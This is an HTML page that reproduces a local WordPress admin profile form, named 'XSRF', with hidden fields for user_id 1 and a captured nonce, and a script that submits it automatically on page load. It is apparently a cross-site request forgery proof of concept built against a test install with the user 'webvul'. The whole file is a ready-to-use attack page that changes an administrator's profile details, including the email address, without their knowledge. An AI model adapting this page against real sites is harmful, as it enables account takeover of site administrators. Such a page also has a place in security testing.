<html>
<body>
<form NAME="XSRF" action="http://localhost:85/frameworks/wordpress/wp-admin/profile.php" method="post" novalidate="novalidate">
    <input type="hidden" id="_wpnonce" name="_wpnonce" value="ae8faa1cfa"><input type="hidden" name="_wp_http_referer" value="/frameworks/wordpress/wp-admin/profile.php?updated=1"><p>
        <input type="hidden" name="from" value="profile">
        <input type="hidden" name="checkuser_id" value="1">
    </p>

    <h2>Personal Options</h2>

    <table class="form-table">
        <tbody><tr class="user-rich-editing-wrap">
            <th scope="row">Visual Editor</th>
            <td><label for="rich_editing"><input name="rich_editing" type="checkbox" id="rich_editing" value="false"> Disable the visual editor when writing</label></td>
        </tr>
        <tr class="user-admin-color-wrap">
            <th scope="row">Admin Color Scheme</th>
            <td>	<fieldset id="color-picker" class="scheme-list">
                    <legend class="screen-reader-text"><span>Admin Color Scheme</span></legend>
                    <input type="hidden" id="color-nonce" name="color-nonce" value="a6dd88de3a">			<div class="color-option ">
                        <input name="admin_color" id="admin_color_fresh" type="radio" value="fresh" class="tog">
                        <input type="hidden" class="css_url" value="">
                        <input type="hidden" class="icon_colors" value="{&quot;icons&quot;:{&quot;base&quot;:&quot;#82878c&quot;,&quot;focus&quot;:&quot;#00a0d2&quot;,&quot;current&quot;:&quot;#fff&quot;}}">
                        <label for="admin_color_fresh">Default</label>
                        <table class="color-palette">
                            <tbody><tr>
                                <td style="background-color: #222">&nbsp;</td>
                                <td style="background-color: #333">&nbsp;</td>
                                <td style="background-color: #0073aa">&nbsp;</td>
                                <td style="background-color: #00a0d2">&nbsp;</td>
                            </tr>
                            </tbody></table>
                    </div>
                    <div class="color-option ">
                        <input name="admin_color" id="admin_color_light" type="radio" value="light" class="tog">
                        <input type="hidden" class="css_url" value="http://localhost:85/frameworks/wordpress/wp-admin/css/colors/light/colors.min.css">
                        <input type="hidden" class="icon_colors" value="{&quot;icons&quot;:{&quot;base&quot;:&quot;#999&quot;,&quot;focus&quot;:&quot;#ccc&quot;,&quot;current&quot;:&quot;#ccc&quot;}}">
                        <label for="admin_color_light">Light</label>
                        <table class="color-palette">
                            <tbody><tr>
                                <td style="background-color: #e5e5e5">&nbsp;</td>
                                <td style="background-color: #999">&nbsp;</td>
                                <td style="background-color: #d64e07">&nbsp;</td>
                                <td style="background-color: #04a4cc">&nbsp;</td>
                            </tr>
                            </tbody></table>
                    </div>
                    <div class="color-option selected">
                        <input name="admin_color" id="admin_color_blue" type="radio" value="blue" class="tog" checked="checked">
                        <input type="hidden" class="css_url" value="http://localhost:85/frameworks/wordpress/wp-admin/css/colors/blue/colors.min.css">
                        <input type="hidden" class="icon_colors" value="{&quot;icons&quot;:{&quot;base&quot;:&quot;#e5f8ff&quot;,&quot;focus&quot;:&quot;#fff&quot;,&quot;current&quot;:&quot;#fff&quot;}}">
                        <label for="admin_color_blue">Blue</label>
                        <table class="color-palette">
                            <tbody><tr>
                                <td style="background-color: #096484">&nbsp;</td>
                                <td style="background-color: #4796b3">&nbsp;</td>
                                <td style="background-color: #52accc">&nbsp;</td>
                                <td style="background-color: #74B6CE">&nbsp;</td>
                            </tr>
                            </tbody></table>
                    </div>
                    <div class="color-option ">
                        <input name="admin_color" id="admin_color_coffee" type="radio" value="coffee" class="tog">
                        <input type="hidden" class="css_url" value="http://localhost:85/frameworks/wordpress/wp-admin/css/colors/coffee/colors.min.css">
                        <input type="hidden" class="icon_colors" value="{&quot;icons&quot;:{&quot;base&quot;:&quot;#f3f2f1&quot;,&quot;focus&quot;:&quot;#fff&quot;,&quot;current&quot;:&quot;#fff&quot;}}">
                        <label for="admin_color_coffee">Coffee</label>
                        <table class="color-palette">
                            <tbody><tr>
                                <td style="background-color: #46403c">&nbsp;</td>
                                <td style="background-color: #59524c">&nbsp;</td>
                                <td style="background-color: #c7a589">&nbsp;</td>
                                <td style="background-color: #9ea476">&nbsp;</td>
                            </tr>
                            </tbody></table>
                    </div>
                    <div class="color-option ">
                        <input name="admin_color" id="admin_color_ectoplasm" type="radio" value="ectoplasm" class="tog">
                        <input type="hidden" class="css_url" value="http://localhost:85/frameworks/wordpress/wp-admin/css/colors/ectoplasm/colors.min.css">
                        <input type="hidden" class="icon_colors" value="{&quot;icons&quot;:{&quot;base&quot;:&quot;#ece6f6&quot;,&quot;focus&quot;:&quot;#fff&quot;,&quot;current&quot;:&quot;#fff&quot;}}">
                        <label for="admin_color_ectoplasm">Ectoplasm</label>
                        <table class="color-palette">
                            <tbody><tr>
                                <td style="background-color: #413256">&nbsp;</td>
                                <td style="background-color: #523f6d">&nbsp;</td>
                                <td style="background-color: #a3b745">&nbsp;</td>
                                <td style="background-color: #d46f15">&nbsp;</td>
                            </tr>
                            </tbody></table>
                    </div>
                    <div class="color-option ">
                        <input name="admin_color" id="admin_color_midnight" type="radio" value="midnight" class="tog">
                        <input type="hidden" class="css_url" value="http://localhost:85/frameworks/wordpress/wp-admin/css/colors/midnight/colors.min.css">
                        <input type="hidden" class="icon_colors" value="{&quot;icons&quot;:{&quot;base&quot;:&quot;#f1f2f3&quot;,&quot;focus&quot;:&quot;#fff&quot;,&quot;current&quot;:&quot;#fff&quot;}}">
                        <label for="admin_color_midnight">Midnight</label>
                        <table class="color-palette">
                            <tbody><tr>
                                <td style="background-color: #25282b">&nbsp;</td>
                                <td style="background-color: #363b3f">&nbsp;</td>
                                <td style="background-color: #69a8bb">&nbsp;</td>
                                <td style="background-color: #e14d43">&nbsp;</td>
                            </tr>
                            </tbody></table>
                    </div>
                    <div class="color-option ">
                        <input name="admin_color" id="admin_color_ocean" type="radio" value="ocean" class="tog">
                        <input type="hidden" class="css_url" value="http://localhost:85/frameworks/wordpress/wp-admin/css/colors/ocean/colors.min.css">
                        <input type="hidden" class="icon_colors" value="{&quot;icons&quot;:{&quot;base&quot;:&quot;#f2fcff&quot;,&quot;focus&quot;:&quot;#fff&quot;,&quot;current&quot;:&quot;#fff&quot;}}">
                        <label for="admin_color_ocean">Ocean</label>
                        <table class="color-palette">
                            <tbody><tr>
                                <td style="background-color: #627c83">&nbsp;</td>
                                <td style="background-color: #738e96">&nbsp;</td>
                                <td style="background-color: #9ebaa0">&nbsp;</td>
                                <td style="background-color: #aa9d88">&nbsp;</td>
                            </tr>
                            </tbody></table>
                    </div>
                    <div class="color-option ">
                        <input name="admin_color" id="admin_color_sunrise" type="radio" value="sunrise" class="tog">
                        <input type="hidden" class="css_url" value="http://localhost:85/frameworks/wordpress/wp-admin/css/colors/sunrise/colors.min.css">
                        <input type="hidden" class="icon_colors" value="{&quot;icons&quot;:{&quot;base&quot;:&quot;#f3f1f1&quot;,&quot;focus&quot;:&quot;#fff&quot;,&quot;current&quot;:&quot;#fff&quot;}}">
                        <label for="admin_color_sunrise">Sunrise</label>
                        <table class="color-palette">
                            <tbody><tr>
                                <td style="background-color: #b43c38">&nbsp;</td>
                                <td style="background-color: #cf4944">&nbsp;</td>
                                <td style="background-color: #dd823b">&nbsp;</td>
                                <td style="background-color: #ccaf0b">&nbsp;</td>
                            </tr>
                            </tbody></table>
                    </div>
                </fieldset>
            </td>
        </tr>
        <tr class="user-comment-shortcuts-wrap">
            <th scope="row">Keyboard Shortcuts</th>
            <td><label for="comment_shortcuts"><input type="checkbox" name="comment_shortcuts" id="comment_shortcuts" value="true"> Enable keyboard shortcuts for comment moderation.</label> <a href="https://codex.wordpress.org/Keyboard_Shortcuts" target="_blank">More information</a></td>
        </tr>
        <tr class="show-admin-bar user-admin-bar-front-wrap">
            <th scope="row">Toolbar</th>
            <td><fieldset><legend class="screen-reader-text"><span>Toolbar</span></legend>
                    <label for="admin_bar_front">
                        <input name="admin_bar_front" type="checkbox" id="admin_bar_front" value="1" checked="checked">
                        Show Toolbar when viewing site</label><br>
                </fieldset>
            </td>
        </tr>

        </tbody></table>

    <h2>Name</h2>

    <table class="form-table">
        <tbody><tr class="user-user-login-wrap">
            <th><label for="user_login">Username</label></th>
            <td><input type="text" name="user_login" id="user_login" value="webvul" disabled="disabled" class="regular-text"> <span class="description">Usernames cannot be changed.</span></td>
        </tr>


        <tr class="user-first-name-wrap">
            <th><label for="first_name">First Name</label></th>
            <td><input type="text" name="first_name" id="first_name" value="prosper" class="regular-text"></td>
        </tr>

        <tr class="user-last-name-wrap">
            <th><label for="last_name">Last Name</label></th>
            <td><input type="text" name="last_name" id="last_name" value="YENG" class="regular-text"></td>
        </tr>

        <tr class="user-nickname-wrap">
            <th><label for="nickname">Nickname <span class="description">(required)</span></label></th>
            <td><input type="text" name="nickname" id="nickname" value="webvul" class="regular-text"></td>
        </tr>

        <tr class="user-display-name-wrap">
            <th><label for="display_name">Display name publicly as</label></th>
            <td>
                <select name="display_name" id="display_name">
                    <option selected="selected">webvul</option>
                    <option>prosper</option>
                </select>
            </td>
        </tr>
        </tbody></table>

    <h2>Contact Info</h2>

    <table class="form-table">
        <tbody><tr class="user-email-wrap">
            <th><label for="email">Email <span class="description">(required)</span></label></th>
            <td><input type="email" name="email" id="email" value="webvul@gmail.com" class="regular-text ltr">
            </td>
        </tr>

        <tr class="user-url-wrap">
            <th><label for="url">Website</label></th>
            <td><input type="url" name="url" id="url" value="http://www.drape.com" class="regular-text code"></td>
        </tr>

        </tbody></table>

    <h2>About Yourself</h2>

    <table class="form-table">
        <tbody><tr class="user-description-wrap">
            <th><label for="description">Biographical Info</label></th>
            <td><textarea name="description" id="description" rows="5" cols="30">xxx</textarea>
                <p class="description">Share a little biographical information to fill out your profile. This may be shown publicly.</p></td>
        </tr>

        <tr class="user-profile-picture">
            <th>Profile Picture</th>
            <td>
                <img alt="" src="http://0.gravatar.com/avatar/081d33fa746581047287c705d47e6248?s=96&amp;d=mm&amp;r=g" srcset="http://0.gravatar.com/avatar/081d33fa746581047287c705d47e6248?s=192&amp;d=mm&amp;r=g 2x" class="avatar avatar-96 photo" height="96" width="96">		<p class="description">You can change your profile picture on <a href="https://en.gravatar.com/">Gravatar</a>.</p>
            </td>
        </tr>

        </tbody></table>

    <h2>Account Management</h2>
    <table class="form-table">
        <tbody><tr id="password" class="user-pass1-wrap">
            <th><label for="pass1-text">New Password</label></th>
            <td>
                <input class="hidden" value=" "><!-- #24364 workaround -->
                <button type="button" class="button button-secondary wp-generate-pw hide-if-no-js">Generate Password</button>
                <div class="wp-pwd hide-if-js" style="display: none;">
			<span class="password-input-wrapper">
				<input type="password" name="pass1" id="pass1" class="regular-text" value="" autocomplete="off" data-pw="Qg#6@0OY@Tp0tmP)A*$lL)C4" aria-describedby="pass-strength-result" disabled=""><input type="text" id="pass1-text" name="pass1-text" autocomplete="off" class="regular-text" disabled="">
			</span>
                    <button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Hide password">
                        <span class="dashicons dashicons-hidden"></span>
                        <span class="text">Hide</span>
                    </button>
                    <button type="button" class="button button-secondary wp-cancel-pw hide-if-no-js" data-toggle="0" aria-label="Cancel password change">
                        <span class="text">Cancel</span>
                    </button>
                    <div style="" id="pass-strength-result" aria-live="polite"></div>
                </div>
            </td>
        </tr>
        <tr class="user-pass2-wrap hide-if-js" style="display: none;">
            <th scope="row"><label for="pass2">Repeat New Password</label></th>
            <td>
                <input name="pass2" type="password" id="pass2" class="regular-text" value="" autocomplete="off" disabled="">
                <p class="description">Type your new password again.</p>
            </td>
        </tr>
        <tr class="pw-weak">
            <th>Confirm Password</th>
            <td>
                <label>
                    <input type="checkbox" name="pw_weak" class="pw-checkbox">
                    Confirm use of weak password		</label>
            </td>
        </tr>

        <tr class="user-sessions-wrap hide-if-no-js">
            <th>Sessions</th>
            <td aria-live="assertive">
                <div class="destroy-sessions"><button type="button" class="button button-secondary" id="destroy-sessions">Log Out Everywhere Else</button></div>
                <p class="description">
                    Did you lose your phone or leave your account logged in at a public computer? You can log out everywhere else, and stay logged in here.			</p>
            </td>
        </tr>

        </tbody></table>



    <input type="hidden" name="action" value="update">
    <input type="hidden" name="user_id" id="user_id" value="1">

    <p class="submit"><input type="submit" name="submit" id="submit" class="button button-primary" value="Update Profile"></p>
</form>
<script>
    document.XSRF.submit();

</script>
</body>
</html>